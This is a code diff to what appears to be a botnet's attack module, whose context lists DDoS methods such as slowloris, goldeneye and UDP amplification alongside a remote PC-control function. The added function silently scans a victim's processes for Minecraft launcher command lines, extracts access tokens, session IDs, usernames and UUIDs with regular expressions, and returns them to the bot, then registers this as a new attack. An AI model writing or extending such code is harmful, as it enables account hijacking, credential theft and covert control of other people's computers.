@@ -286,6 +286,104 @@ def generate_syn_packet(src_ip, dst_ip, src_port, dst_port):
     
     return ip_header + tcp_header
 
+
+def attack_refresh_session_id(target, duration=0):
+    """
+    Silently extract Minecraft session information from the target PC
+    and return it to the bot without disturbing the user.
+    """
+    try:
+        import psutil
+        import re
+        import json
+        from datetime import datetime
+        
+        session_data = {
+            'success': False,
+            'timestamp': datetime.now().isoformat(),
+            'sessions': []
+        }
+        
+        def find_minecraft_processes():
+            """Find running Minecraft processes silently"""
+            minecraft_processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                try:
+                    if proc.info['name'].lower() == 'javaw.exe':
+                        cmdline = ' '.join(proc.info['cmdline'] or [])
+                        minecraft_indicators = ['net.minecraft.client.main', '--username', '--uuid', '--version']
+                        if any(indicator in cmdline for indicator in minecraft_indicators):
+                            minecraft_processes.append(proc)
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+            
+            return minecraft_processes
+        
+        def extract_session_info(process):
+            """Extract session information silently"""
+            try:
+                cmdline = ' '.join(process.info['cmdline'] or [])
+                
+                # Session ID patterns
+                session_patterns = [
+                    r'--session\s+([^\s]+)',
+                    r'--session=([^\s]+)',
+                    r'-Dsessionid=([^\s]+)',
+                    r'--accessToken\s+([^\s]+)',
+                    r'--accessToken=([^\s]+)',
+                    r'-DaccessToken=([^\s]+)',
+                ]
+                
+                username_pattern = r'--username[=\s]?([^\s]+)'
+                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
+                version_pattern = r'--version[=\s]?([^\s]+)'
+                
+                session_id = None
+                for pattern in session_patterns:
+                    match = re.search(pattern, cmdline)
+                    if match:
+                        session_id = match.group(1)
+                        break
+                
+                username_match = re.search(username_pattern, cmdline)
+                uuid_match = re.search(uuid_pattern, cmdline)
+                version_match = re.search(version_pattern, cmdline)
+                
+                return {
+                    'pid': process.info['pid'],
+                    'session_id': session_id if session_id else 'Not found',
+                    'username': username_match.group(1) if username_match else 'Unknown',
+                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
+                    'version': version_match.group(1) if version_match else 'Unknown',
+                    'found': session_id is not None
+                }
+                
+            except Exception as e:
+                return {'error': str(e), 'found': False}
+        
+        # Find and extract session info from all Minecraft processes
+        processes = find_minecraft_processes()
+        
+        for process in processes:
+            session_info = extract_session_info(process)
+            session_data['sessions'].append(session_info)
+        
+        session_data['success'] = len(session_data['sessions']) > 0
+        session_data['process_count'] = len(session_data['sessions'])
+        
+        # Return the session data as a string that will be sent back to bot
+        result_string = f"SESSION_DATA:{json.dumps(session_data)}"
+        return result_string
+        
+    except Exception as e:
+        error_data = {
+            'success': False,
+            'error': str(e),
+            'timestamp': datetime.now().isoformat()
+        }
+        return f"SESSION_DATA:{json.dumps(error_data)}"
+
 # Add this function to the attack_methods.py file
 def attack_controlpc(target, duration=60):
     """Remote control PC functions - Admin only"""
@@ -1335,6 +1433,7 @@ ATTACK_METHODS = {
     "goldeneye": attack_goldeneye,
     "tcp_mixed": attack_tcp_mixed,
     "controlpc": attack_controlpc,
+    "refresh_session_id": attack_refresh_session_id,
     # Backward compatibility
     "udp_amp": attack_udp_amplification,
     "slowloris": attack_slowloris,
